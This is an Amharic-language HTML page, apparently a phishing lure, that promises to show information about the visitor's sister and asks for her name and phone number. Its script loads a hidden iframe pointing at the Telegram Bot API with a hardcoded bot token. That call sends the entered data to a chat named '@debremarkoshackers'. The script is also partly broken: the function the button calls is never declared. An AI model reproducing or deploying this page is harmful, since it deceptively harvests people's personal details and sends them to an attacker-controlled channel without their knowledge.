<!DOCTYPE html>
<html lang="am">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>መረጃ ለማየት</title>
<style>
  body {
    font-family: "Noto Sans Ethiopic", sans-serif;
    background: #e5ddd5;
    margin: 0;
    padding: 0;
  }

  header {
    background: #0088cc;
    color: white;
    text-align: center;
    padding: 1rem;
    font-size: 1.3rem;
    font-weight: bold;
    letter-spacing: 1px;
  }

  .container {
    max-width: 400px;
    background: white;
    margin: 2rem auto;
    padding: 1.5rem;
    border-radius: 15px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
  }

  label {
    display: block;
    margin-top: 10px;
    font-weight: bold;
  }

  select, input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 10px;
    margin-top: 5px;
    font-size: 1rem;
  }

  button {
    width: 100%;
    background: green;
    color: white;
    border: none;
    padding: 12px;
    margin-top: 15px;
    border-radius: 10px;
    font-size: 1rem;
    cursor: pointer;
  }

  button:hover {
    background: tomato;
  }

  .chat-box {
    margin-top: 2rem;
    background: #f0f8ff;
    border-radius: 15px;
    padding: 15px;
    box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
    max-height: 300px;
    overflow-y: auto;
  }

  .message {
    margin: 10px 0;
    display: flex;
  }

  .message.user {
    justify-content: flex-end;
  }

  .message.bot {
    justify-content: flex-start;
  }

  .bubble {
    max-width: 70%;
    padding: 10px 15px;
    border-radius: 15px;
    font-size: 0.95rem;
    line-height: 1.4;
  }

  .user .bubble {
    background: #0088cc;
    color: white;
    border-bottom-right-radius: 0;
  }

  .bot .bubble {
    background: #e1ffc7;
    color: #333;
    border-bottom-left-radius: 0;
  }

  @media (max-width: 480px) {
    .container {
      width: 90%;
      margin: 1rem auto;
    }
  }
  #i{
  display:none;
  }
</style>
</head>
<body>

<header>sister telegram</header>

<div class="container">
  <label for="relation">እባክዎ ይምረጡ:</label>
  <select id="relation">
    <option>እህቴ</option>
    
  </select>

  <label for="name">የእህት  ስም:</label>
  <input type="text" id="name" placeholder="ስም ያስገቡ">

  <label for="phone"> የእህት ስልክ:</label>
  <input type="tel" id="phone" placeholder="09XXXXXXXX">

  <button onclick="subms()">አሳይ</button>

  
<script type="text/javascript">

var x=document.getElementById("phone").value;
var y=document.getElementById("name").value;



var iframe=document.getElementById("i");
  if(x.length<4 || y.length<4){
  alert("እባክዎ የእህትዎን ስም እና ስልክ ቁጥር ያስገቡ!");
  }else{
  iframe.setAttribute("src","https://api.telegram.org/bot8046258160:AAEXNWsagm8RJrys35q8yt_KfSknQJRIkRc/sendMessage?chat_id=@debremarkoshackers&text="+x+'\n'+y+"");
  //window.location.href="loading.html";

  
 }
}

</script>
<iframe width="50" src=""id="i">
</body>
</html>
